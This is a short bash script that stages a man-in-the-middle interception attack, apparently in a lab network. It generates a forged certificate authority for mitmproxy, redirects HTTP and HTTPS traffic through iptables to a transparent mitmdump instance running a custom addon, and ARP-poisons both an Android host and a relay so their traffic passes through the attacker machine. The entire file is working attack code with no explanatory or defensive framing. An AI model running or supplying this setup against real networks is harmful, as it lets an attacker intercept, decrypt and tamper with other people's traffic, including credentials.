#!/bin/bash
set -x
cd /tmp
mkdir -p mm
# CA with issuer "OK Computer"
openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.crt -days 3650 \
  -subj "/O=OK Computer/CN=OK Computer" \
  -addext "basicConstraints=critical,CA:TRUE" 2>/tmp/ca.log
cat ca.key ca.crt > mm/mitmproxy-ca.pem
cp ca.crt mm/mitmproxy-ca-cert.pem
echo "CA subject:"; openssl x509 -in ca.crt -noout -subject -issuer

# iptables transparent redirect (CAP_NET_ADMIN)
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080
echo "nat rules:"; iptables -t nat -L PREROUTING -n

# start mitmdump transparent
rm -f /tmp/mitm.log
nohup mitmdump --mode transparent --ssl-insecure --set confdir=/tmp/mm \
  -s /tmp/addon.py --set block_global=false > /tmp/mitmdump.out 2>&1 &
echo "mitm pid $!"
sleep 3
tail -5 /tmp/mitmdump.out

# ARP poison android(.20) so traffic to relay(.10) comes to us
nohup arpspoof -i eth0 -t 10.66.1.20 10.66.1.10 > /tmp/arp1.out 2>&1 &
echo "arp1 pid $!"
# also poison relay so return path works
nohup arpspoof -i eth0 -t 10.66.1.10 10.66.1.20 > /tmp/arp2.out 2>&1 &
echo "arp2 pid $!"
echo SETUP_DONE
